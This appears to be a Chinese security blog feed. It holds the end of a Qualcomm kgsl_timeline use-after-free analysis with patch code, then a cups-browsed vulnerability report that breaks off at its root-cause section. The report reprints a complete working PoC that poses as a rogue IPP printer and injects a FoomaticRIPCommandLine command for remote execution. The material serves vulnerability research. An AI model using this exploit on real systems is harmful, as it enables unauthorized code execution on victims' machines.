中，kgsl_ioctl_timeline_destroy函数会将dma_fence 加锁，防止其他的线程操作这个指针，在 Thread1 中的第一个线程锁内，会调用dma_fence_get 函数给fence增加 refcount ，然后将timeline 中的fences列表清空并整个复制给 temp临时变量。<br>同时在 Thread2 中，如果进入到 kgsl_ioctl_timeline_fence_get 函数内，但用户关闭 和 sync_file 绑定的文件描述符 fd 时，会调用dma_fence_put函数减少 fence 的引用计数，从而触发 timeline_fence_release 函数。<br>在条件竞争的状态下，timeline_fence_release 函数会接过 timeline-&gt;fence_lock ，进而释放fence，造成悬空指针。<br>在 Thread2 释放完fence内存之后， Thread1 会继续接管 timeline-&gt;lock ，然后遍历temp临时变量中 fence 引用，从而触发释放后重用。</p><h2 id="漏洞缓解措施"><a href="#漏洞缓解措施" class="headerlink" title="漏洞缓解措施"></a>漏洞缓解措施</h2><p>在<code>kgsl_ioctl_timeline_destroy</code> 函数中的一块锁的区域中加入了kref_get_unless_zero 函数用以对fence 的refcount 判断，如果当前fence的refcount 为 0 ，那就直接将这个fence节点从列表内移除。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">spin_lock</span>(&amp;timeline-&gt;</span>fence_lock);<br><span class="hljs-function"><span class="hljs-title">list_for_each_entry_safe</span>(fence, tmp, &amp;timeline-&gt;</span>fences, node)<br><span class="hljs-function"><span class="hljs-title">if</span> (!kref_get_unless_zero(&amp;fence-&gt;</span>base.refcount))<br><span class="hljs-function"><span class="hljs-title">list_del_init</span>(&amp;fence-&gt;</span>node);<br><span class="hljs-function"><span class="hljs-title">list_replace_init</span>(&amp;timeline-&gt;</span>fences, &amp;temp);<br><span class="hljs-function"><span class="hljs-title">spin_unlock</span>(&amp;timeline-&gt;</span>fence_lock);<br></code></pre></td></tr></table></figure><p>另外修复的情况还有另一处: kgsl_timeline_signal , 代码逻辑和 kgsl_ioctl_timeline_destroy 是一致的。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xl">void kgsl_timeline_signal(struct kgsl_timeline *timeline, u64 seqno)<br>&#123;<br>struct kgsl_timeline_fence *fence, *tmp;<br>struct list_head temp;<br>INIT_LIST_HEAD(&amp;temp);<br><span class="hljs-function"><span class="hljs-title">spin_lock_irq</span>(&amp;timeline-&gt;</span>lock);<br><span class="hljs-function"><span class="hljs-title">if</span> (seqno &lt; timeline-&gt;</span>value)<br>goto unlock;<br><span class="hljs-function"><span class="hljs-title">trace_kgsl_timeline_signal</span>(timeline-&gt;</span>id, seqno);<br><span class="hljs-function"><span class="hljs-title">timeline</span>-&gt;</span>value = seqno;<br><span class="hljs-function"><span class="hljs-title">spin_lock</span>(&amp;timeline-&gt;</span>fence_lock);<br><span class="hljs-function"><span class="hljs-title">list_for_each_entry_safe</span>(fence, tmp, &amp;timeline-&gt;</span>fences, node)<br><span class="hljs-function"><span class="hljs-title">if</span> (timeline_fence_signaled(&amp;fence-&gt;</span>base) &amp;&amp;<br><span class="hljs-function"><span class="hljs-title">kref_get_unless_zero</span>(&amp;fence-&gt;</span>base.refcount))<br><span class="hljs-function"><span class="hljs-title">list_move</span>(&amp;fence-&gt;</span>node, &amp;temp);<br><span class="hljs-function"><span class="hljs-title">spin_unlock</span>(&amp;timeline-&gt;</span>fence_lock);<br>list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123;<br><span class="hljs-function"><span class="hljs-title">dma_fence_signal_locked</span>(&amp;fence-&gt;</span>base);<br><span class="hljs-function"><span class="hljs-title">dma_fence_put</span>(&amp;fence-&gt;</span>base);<br>&#125;<br>unlock:<br><span class="hljs-function"><span class="hljs-title">spin_unlock_irq</span>(&amp;timeline-&gt;</span>lock);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>现阶段归纳总结了不少有关内核驱动的漏洞，目前在google 和Qualcomm 安全公告中相当多的漏洞高危漏洞是由于条件竞争引发的UAF，或者是由隐含假设造成的引用计数错误的问题，以及OOB。发现这些漏洞目前最有效的办法，就是关注kernel分支中引入的功能，以及添加的新的代码，虽然这些新引入的内容在发布之前仍然进行了源代码审计和安全性评估，但依旧可能存在一些没有考虑到的方面，比如条件竞争、共享内存分配管理、引用计数是否合理等等。<br>比如本篇文章中是在Qualcomm msm5.4 内核分支中引入的kgsl_timeline 功能的同时，加入了大量的新ioctl，这些ioctl 是可以直接从用户空间调取，这些新的代码会导致新的问题出现。因此在进行kernel 安全研究的时候，如果持续关注这些kernel新的特性，或许会有机会。 </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>cup_browsed_漏洞分析报告</title>
    <link href="/2024/12/11/25__cups_browsed_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
    <url>/2024/12/11/25__cups_browsed_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞披露信息"><a href="#0x01-漏洞披露信息" class="headerlink" title="0x01 漏洞披露信息"></a>0x01 漏洞披露信息</h2><ul><li>2024 年 9 月 26 日，安全研究员 Simone Margaritelli（@evilsocket）披露了影响CUPS 打印系统的<code>cups-browsed</code>、<code>libscupsfilters</code>和<code>libppd</code>组件的多个漏洞，影响 2.0.1 以下版本 <a href="https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/">https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/</a></li><li>起因是cups 系统的cups-browsed 组件无需身份验证暴露631端口，并且通过IPP协议建立连接后自动添加远程在线的打印机。</li><li>打印机可以选择使用<code>foomatic-rip</code>过滤器，允许通过指令执行任意命令<code>FoomaticRIPCommandLine</code>，这是一个已知（<a href="https://nvd.nist.gov/vuln/detail/CVE-2011-2697">CVE-2011-2697</a>、<a href="https://nvd.nist.gov/vuln/detail/CVE-2011-2964">CVE-2011-2964</a>）但自 2011 年以来一直未修补的问题。</li><li>受影响的系统包括大多数 GNU&#x2F;Linux 发行版、BSD、ChromeOS 和 Solaris，其中许多系统<code>cups-browsed</code>默认启用该服务。</li></ul><h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><h3 id="POC链接"><a href="#POC链接" class="headerlink" title="POC链接"></a>POC链接</h3><p><a href="https://github.com/RickdeJager/cupshax">https://github.com/RickdeJager/cupshax</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> uuid <span class="hljs-keyword">import</span> uuid4<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><span class="hljs-keyword">from</span> zeroconf <span class="hljs-keyword">import</span> ServiceInfo, Zeroconf<br><span class="hljs-keyword">from</span> ippserver.behaviour <span class="hljs-keyword">import</span> StatelessPrinter<br><span class="hljs-keyword">from</span> ippserver.server <span class="hljs-keyword">import</span> IPPServer, IPPRequestHandler<br><span class="hljs-keyword">from</span> ippserver.constants <span class="hljs-keyword">import</span> SectionEnum, TagEnum, OperationEnum<br><span class="hljs-keyword">from</span> ippserver.parsers <span class="hljs-keyword">import</span> Enum, Boolean, Integer<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Discovery</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, printer_name, ip_address, port</span>):<br>        self.printer_name = printer_name<br>        self.printer_name_slug = Discovery.slugify_name(printer_name)<br>        self.ip_address = ip_address<br>        self.port = port<br>        self.zeroconf = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">slugify_name</span>(<span class="hljs-params">name</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join([c <span class="hljs-keyword">if</span> c.isalnum() <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;_&quot;</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> name])<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_ipp_printer_service</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># IPP over TCP (standard IPP service)</span><br>        service_type = <span class="hljs-string">&quot;_ipp._tcp.local.&quot;</span><br>        service_name = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.printer_name_slug&#125;</span>._ipp._tcp.local.&quot;</span><br><br>        <span class="hljs-comment"># TXT records with IPP and localization attributes</span><br>        txt_records = &#123;<br>            <span class="hljs-string">&quot;txtvers&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,                     <span class="hljs-comment"># TXT record version</span><br>            <span class="hljs-string">&quot;qtotal&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,                      <span class="hljs-comment"># Number of print queues</span><br>            <span class="hljs-string">&quot;rp&quot;</span>: <span class="hljs-string">f&quot;printers/hax&quot;</span>,  <span class="hljs-comment"># Resource path</span><br>            <span class="hljs-string">&quot;ty&quot;</span>: self.printer_name,<br>            <span class="hljs-comment"># Supported PDLs (PostScript, PDF)</span><br>            <span class="hljs-string">&quot;pdl&quot;</span>: <span class="hljs-string">&quot;application/postscript,application/pdf&quot;</span>,<br>            <span class="hljs-comment"># Printer admin URL</span><br>            <span class="hljs-string">&quot;adminurl&quot;</span>: <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;self.ip_address&#125;</span>:<span class="hljs-subst">&#123;self.port&#125;</span>&quot;</span>,<br>            <span class="hljs-string">&quot;UUID&quot;</span>: <span class="hljs-built_in">str</span>(uuid4()),  <span class="hljs-comment"># Unique identifier</span><br>            <span class="hljs-comment"># IPP printer type (e.g., 0x800683 for color, duplex, etc.)</span><br>            <span class="hljs-string">&quot;printer-type&quot;</span>: <span class="hljs-string">&quot;0x800683&quot;</span>,<br>        &#125;<br><br>        service_info = ServiceInfo(<br>            service_type,<br>            service_name,<br>            addresses=[socket.inet_aton(self.ip_address)],<br>            port=self.port,<br>            properties=txt_records,<br>            server=<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.printer_name_slug&#125;</span>.local.&quot;</span>,<br>        )<br><br>        <span class="hljs-keyword">return</span> service_info<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">self</span>):<br>        self.zeroconf = Zeroconf()<br>        self.service_info = self.create_ipp_printer_service()<br>        self.zeroconf.register_service(self.service_info)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">close</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> self.zeroconf <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span><br>        self.zeroconf.unregister_service(self.service_info)<br>        self.zeroconf.close()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__del__</span>(<span class="hljs-params">self</span>):<br>        self.close()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HaxPrinter</span>(<span class="hljs-title class_ inherited__">StatelessPrinter</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, command, name</span>):<br>        self.cups_filter = <span class="hljs-string">&#x27;*cupsFilter2: &quot;application/vnd.cups-pdf application/pdf 0 foomatic-rip&quot;&#x27;</span><br>        self.foomatic_rip = <span class="hljs-string">f&#x27;*FoomaticRIPCommandLine: <span class="hljs-subst">&#123;command&#125;</span> #&#x27;</span><br>        self.name = name<br>        <span class="hljs-built_in">super</span>(HaxPrinter, self).__init__()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">minimal_attributes</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> &#123;<br>            <span class="hljs-comment"># This list comes from</span><br>            <span class="hljs-comment"># https://tools.ietf.org/html/rfc2911</span><br>            <span class="hljs-comment"># Section 3.1.4.2 Response Operation Attributes</span><br>            (<br>                SectionEnum.operation,<br>                <span class="hljs-string">b&#x27;attributes-charset&#x27;</span>,<br>                TagEnum.charset<br>            ): [<span class="hljs-string">b&#x27;utf-8&#x27;</span>],<br>            (<br>                SectionEnum.operation,<br>                <span class="hljs-string">b&#x27;attributes-natural-language&#x27;</span>,<br>                TagEnum.natural_language<br>            ): [<span class="hljs-string">b&#x27;en&#x27;</span>],<br>        &#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">printer_list_attributes</span>(<span class="hljs-params">self</span>):<br>        attr = &#123;<br>            <span class="hljs-comment"># rfc2911 section 4.4</span><br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;printer-uri-supported&#x27;</span>,<br>                TagEnum.uri<br>            ): [self.printer_uri],<br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;uri-authentication-supported&#x27;</span>,<br>                TagEnum.keyword<br>            ): [<span class="hljs-string">b&#x27;none&#x27;</span>],<br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;uri-security-supported&#x27;</span>,<br>                TagEnum.keyword<br>            ): [<span class="hljs-string">b&#x27;none&#x27;</span>],<br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;printer-info&#x27;</span>,<br>                TagEnum.text_without_language<br>            ): [<span class="hljs-string">b&#x27;Printer using ipp-printer.py&#x27;</span>],<br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;printer-make-and-model&#x27;</span>,<br>                TagEnum.text_without_language<br>            ): [<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.name&#125;</span> 0.00&#x27;</span>.encode()],<br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;printer-state&#x27;</span>,<br>                TagEnum.enum<br>            ): [Enum(<span class="hljs-number">3</span>).<span class="hljs-built_in">bytes</span>()],  <span class="hljs-comment"># XXX 3 is idle</span><br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;printer-state-reasons&#x27;</span>,<br>                TagEnum.keyword<br>            ): [<span class="hljs-string">b&#x27;none&#x27;</span>],<br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;ipp-versions-supported&#x27;</span>,<br>                TagEnum.keyword<br>            ): [<span class="hljs-string">b&#x27;1.1&#x27;</span>],<br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;operations-supported&#x27;</span>,<br>                TagEnum.enum<br>            ): [<br>                Enum(x).<span class="hljs-built_in">bytes</span>()<br>                <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> (<br>                    OperationEnum.print_job,  <span class="hljs-comment"># (required by cups)</span><br>                    OperationEnum.validate_job,  <span class="hljs-comment"># (required by cups)</span><br>                    OperationEnum.cancel_job,  <span class="hljs-comment"># (required by cups)</span><br>                    OperationEnum.get_job_attributes,  <span class="hljs-comment"># (required by cups)</span><br>                    OperationEnum.get_printer_attributes,<br>                )],<br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;multiple-document-jobs-supported&#x27;</span>,<br>                TagEnum.boolean<br>            ): [Boolean(<span class="hljs-literal">False</span>).<span class="hljs-built_in">bytes</span>()],<br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;charset-configured&#x27;</span>,<br>                TagEnum.charset<br>            ): [<span class="hljs-string">b&#x27;utf-8&#x27;</span>],<br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;charset-supported&#x27;</span>,<br>                TagEnum.charset<br>            ): [<span class="hljs-string">b&#x27;utf-8&#x27;</span>],<br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;natural-language-configured&#x27;</span>,<br>                TagEnum.natural_language<br>            ): [<span class="hljs-string">b&#x27;en&#x27;</span>],<br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;generated-natural-language-supported&#x27;</span>,<br>                TagEnum.natural_language<br>            ): [<span class="hljs-string">b&#x27;en&#x27;</span>],<br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;document-format-default&#x27;</span>,<br>                TagEnum.mime_media_type<br>            ): [<span class="hljs-string">b&#x27;application/pdf&#x27;</span>],<br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;document-format-supported&#x27;</span>,<br>                TagEnum.mime_media_type<br>            ): [<span class="hljs-string">b&#x27;application/pdf&#x27;</span>],<br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;printer-is-accepting-jobs&#x27;</span>,<br>                TagEnum.boolean<br>            ): [Boolean(<span class="hljs-literal">True</span>).<span class="hljs-built_in">bytes</span>()],<br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;queued-job-count&#x27;</span>,<br>                TagEnum.integer<br>            ): [<span class="hljs-string">b&#x27;\x00\x00\x00\x00&#x27;</span>],<br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;pdl-override-supported&#x27;</span>,<br>                TagEnum.keyword<br>            ): [<span class="hljs-string">b&#x27;not-attempted&#x27;</span>],<br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;printer-up-time&#x27;</span>,<br>                TagEnum.integer<br>            ): [Integer(self.printer_uptime()).<span class="hljs-built_in">bytes</span>()],<br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;compression-supported&#x27;</span>,<br>                TagEnum.keyword<br>            ): [<span class="hljs-string">b&#x27;none&#x27;</span>],<br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;printer-name&#x27;</span>,<br>                TagEnum.name_without_language<br>            ): [self.name.encode()],<br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;media-default&#x27;</span>,<br>                TagEnum.keyword<br>            ): [<span class="hljs-string">b&#x27;iso_a4_210x297mm&#x27;</span>],<br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;media-supported&#x27;</span>,<br>                TagEnum.keyword<br>            ): [<span class="hljs-string">b&#x27;iso_a4_210x297mm&#x27;</span>],<br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;media-type&#x27;</span>,<br>                TagEnum.keyword<br>            ): [<span class="hljs-string">b&#x27;stationery&#x27;</span>],<br>            (<br>                SectionEnum.printer,<br>                <span class="hljs-string">b&#x27;media-type-supported&#x27;</span>,<br>                TagEnum.keyword<br>            ): [<span class="hljs-string">b&#x27;stationery&#x27;</span>, <span class="hljs-string">f&#x27;: HAX\n<span class="hljs-subst">&#123;self.foomatic_rip&#125;</span>\n<span class="hljs-subst">&#123;self.cups_filter&#125;</span>\n*%&#x27;</span>.encode()],<br>        &#125;<br>        <span class="hljs-keyword">return</span> attr<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_postscript</span>(<span class="hljs-params">self, _ipp_request, _postscript_file</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_args</span>():<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&quot;CUPSHax: A CUPS PPD injection PoC&quot;</span>)<br>    <br>    parser.add_argument(<span class="hljs-string">&quot;--name&quot;</span>, default=<span class="hljs-string">&quot;RCE Printer&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;The name to use (default: RCE Printer)&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--ip&quot;</span>, required=<span class="hljs-literal">True</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;The IP address of the machine running this script&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--command&quot;</span>, default=<span class="hljs-string">&quot;touch /tmp/pwn&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;The command to execute (default: &#x27;touch /tmp/pwn&#x27;)&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--port&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, default=<span class="hljs-number">8631</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;The port to connect on (default: 8631)&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--base64&quot;</span>, action=argparse.BooleanOptionalAction, default=<span class="hljs-literal">True</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Wrap the command in base64 (default: enabled)&quot;</span>)<br>    <br>    <span class="hljs-keyword">return</span> parser.parse_args()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    args = parse_args()<br>    command = args.command<br>    <span class="hljs-keyword">if</span> args.base64:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Wrapping command in base64...&quot;</span>)<br>        command = <span class="hljs-string">f&quot;echo <span class="hljs-subst">&#123;b64encode(command.encode()).decode()&#125;</span>|base64 -d|sh&quot;</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Command: <span class="hljs-subst">&#123;command&#125;</span>&quot;</span>)<br>    printer = HaxPrinter(command, args.name)<br>    discovery = Discovery(args.name, args.ip, args.port)<br>    <br>    <span class="hljs-comment"># Start a discovery thread</span><br>    discovery_thread = Thread(target=discovery.register)<br>    discovery_thread.start()<br><br>    server = IPPServer((args.ip, args.port), IPPRequestHandler, printer)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Starting IPP server on <span class="hljs-subst">&#123;args.ip&#125;</span>:<span class="hljs-subst">&#123;args.port&#125;</span>...&quot;</span>)<br>        server.serve_forever()<br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Stopping script...&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="复现流程"><a href="#复现流程" class="headerlink" title="复现流程"></a>复现流程</h3><p>kali搭建ippserver打印服务，并传递command<br><img src="/25__cups_browser_%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A.assets/image-20240930174026827.png"></p><p><strong>Debian12</strong><br>受害者机器需要在浏览器中选择打印功能，然后选择kali搭建的打印机，一般来说cup-browser 会自己扫描局域网内的打印机设备，但在复现的过程中，ubuntu22.04 并没有自动扫描到，需要手动添加打印机步骤。<br><img src="/25__cups_browser_%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A.assets/image-20240930173908830.png"></p><p><strong>ubuntu22.04</strong><br><img src="/25__cups_browser_%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A.assets/image-20240930173938556.png"></p><h2 id="0x03-漏洞成因"><a href="#0x03-漏洞成因" class="headerlink" title="0x03 漏洞成因"></a>0x03 